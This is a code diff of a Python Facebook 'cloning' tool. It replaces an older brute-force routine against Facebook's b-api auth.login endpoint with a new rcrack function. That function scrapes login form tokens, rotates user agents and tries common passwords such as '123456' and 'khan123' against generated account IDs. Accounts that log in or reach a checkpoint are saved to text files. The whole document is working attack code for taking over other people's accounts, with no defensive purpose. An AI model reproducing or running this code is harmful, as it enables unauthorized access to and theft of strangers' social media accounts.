+        tl = str(len(user))
+        print(' Total Acounts : '+tl)
+        print(' Selected Code :\x1b[1;92m '+kode)
+        print('\x1b[1;91m If you no result use flight mode')
+        lines()
+        for guru in user:
+            uid = kode+guru
+            pwx=[guru,'MALIK123','pakistan','khankhan','khan123','khan12345','123456','Ahmad123']
+            yaari.submit(rcrack,uid,pwx,tl)
+    print(46*'-')
+    print('IDZ SAVED IN OK.txt : CP.txt')
+    print(46*'-')
+    print('The Process Has Been Complete')
+    print('Press Enter to Back');riaz()
  
-        
-        try:
-            pass1 = user
-            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-            q = json.load(data)
-            if 'access_token' in q:
-                print ' \x1b[1;92m[Afghan_OK] ' + k + c + user + ' | ' + pass1
-                okb = open('Afghan.txt', 'a')
-                okb.write(k + c + user + pass1 + '\n')
-                okb.close()
-                oks.append(c + user + pass1)
-            elif 'www.facebook.com' in q['error_msg']:
-                print ' \x1b[1;93m[Afghan_CP] ' + k + c + user + ' | ' + pass1
-                cps = open('Afghan.txt', 'a')
-                cps.write(k + c + user + pass1 + '\n')
-                cps.close()
-                cpb.append(c + user + pass1)
+ 
+ 
+def rcrack(uid,pwx,tl):
+    #print(user)
+    global loop
+    global cps
+    global oks
+    global proxy
+    try:
+        for ps in pwx:
+            pro = random.choice(ugen)
+            session = requests.Session()
+            free_fb = session.get('https://free.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {'authority':'x.facebook.com',
+			'method':'GET',
+			'path':'/?tbua=1',
+			'scheme':'https',
+			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+			'accept-encoding': 'gzip, deflate, br',
+			'accept-language': 'en-US,en;q=0.9',
+			'cache-control': 'max-age=0',
+			'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 
+			'sec-ch-ua-mobile': '?0',
+			'sec-ch-ua-platform': '"Windows"',
+			"sec-fetch-dest": "document",
+			'sec-fetch-mode': 'navigate',
+			'sec-fetch-site': 'none',
+			'upgrade-insecure-requests': '1',
+			"sec-fetch-user": "?1",
+            'user-agent': pro}
+            lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            #print(iid+'|'+pws+'|'+str(log_cookies))
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[151:166]
+                print('\033[1;32m[AZ.NAZAWALI-OK] '+cid+'|'+ps+'\033[0;97m')
+                open('AZ.NAZAWALI-OK.txt', 'a').write(cid+' | '+ps+ '\n')
+                oks.append(cid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[141:152]
+                print('\033[1;31m[AZ.NAZAWALI-CP] '+uid+' | '+ps+'\x1b[1;97m')
+                open('AZ.NAZAWALI-CP.txt', 'a').write(uid+' | '+ps+'\n')
+                cps.append(cid)
+                break
             else:
-                pass2 = k + c + user
-                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-                q = json.load(data)
-                if 'access_token' in q:
-                    print ' \x1b[1;92m[Afghan_OK] ' + k + c + user + ' | ' + pass2
-                    okb = open('Afghan.txt', 'a')
-                    okb.write(k + c + user + pass2 + '\n')
-                    okb.close()
-                    oks.append(c + user + pass2)
-                elif 'www.facebook.com' in q['error_msg']:
-                    print ' \x1b[1;93m[Afghan_CP] ' + k + c + user + ' | ' + pass2
-                    cps = open('Afghan.txt', 'a')
-                    cps.write(k + c + user + pass2 + '\n')
-                    cps.close()
-                    cpb.append(c + user + pass2)
-                else:
-                    pass3 = pas1
-                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-                    q = json.load(data)
-                    if 'access_token' in q:
-                        print ' \x1b[1;92m[Afghan_OK] ' + k + c + user + ' | ' + pass3
-                        okb = open('Afghan.txt', 'a')
-                        okb.write(k + c + user + pass3 + '\n')
-                        okb.close()
-                        oks.append(c + user + pass3)
-                    elif 'www.facebook.com' in q['error_msg']:
-                        print ' \x1b[1;93m[Afghan_CP] ' + k + c + user + ' | ' + pass3
-                        cps = open('Afghan.txt', 'a')
-                        cps.write(k + c + user + pass3 + '\n')
-                        cps.close()
-                        cpb.append(c + user + pass3)
-                    else:
-                        pass4 = pas2
-                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-                        q = json.load(data)
-                        if 'access_token' in q:
-                            print ' \x1b[1;92m[Afghan_OK] ' + k + c + user + ' | ' + pass4
-                            okb = open('Afghan.txt', 'a')
-                            okb.write(k + c + user + pass4 + '\n')
-                            okb.close()
-                            oks.append(c + user + pass4)
-                        elif 'www.facebook.com' in q['error_msg']:
-                            print ' \x1b[1;93m[Afghan_CP] ' + k + c + user + ' | ' + pass4
-                            cps = open('Afghan.txt', 'a')
-                            cps.write(k + c + user + pass4 + '\n')
-                            cps.close()
-                            cpb.append(c + user + pass4)
-                        else:
-                            pass5 = pas3
-                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-                            q = json.load(data)
-                            if 'access_token' in q:
-                                print ' \x1b[1;92m[Afghan_OK] ' + k + c + user + ' | ' + pass5
-                                okb = open('Afghan.txt', 'a')
-                                okb.write(k + c + user + pass5 + '\n')
-                                okb.close()
-                                oks.append(c + user + pass5)
-                            elif 'www.facebook.com' in q['error_msg']:
-                                print ' \x1b[1;93m[Afghan_CP] ' + k + c + user + ' | ' + pass5
-                                cps = open('Afghan.txt', 'a')
-                                cps.write(k + c + user + pass5 + '\n')
-                                cps.close()
-                                cpb.append(c + user + pass5)
-        except:
-            pass
-        
+                continue
+        loop+=1
+        sys.stdout.write(f'\r[\033[1;97mAZ.NAZAWALI\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
+        sys.stdout.flush()
+    except:
+        pass
  
  
-    p = ThreadPool(30)
-    p.map(main, id)
-    print 54 * '\x1b[1;92m_'
-    print ' \x1b[1;92mThe Process has been Completed ...'
-    print ' \x1b[1;92mTotal Ok/Cp : ' + str(len(oks)) + '/' + str(len(cpb))
-    print ' Cloned Accounts Has Been Saved : Afghan.txt'
-    print ' Note : Cp accounts Will Open after 8/10 days'
-    print 54 * '\x1b[1;92m_'
-    print ''
-    raw_input('\x1b[1;93m Press enter to back ')
-    menu()
- 
-if __name__ == '__main__':
-    youtube()
+riaz()
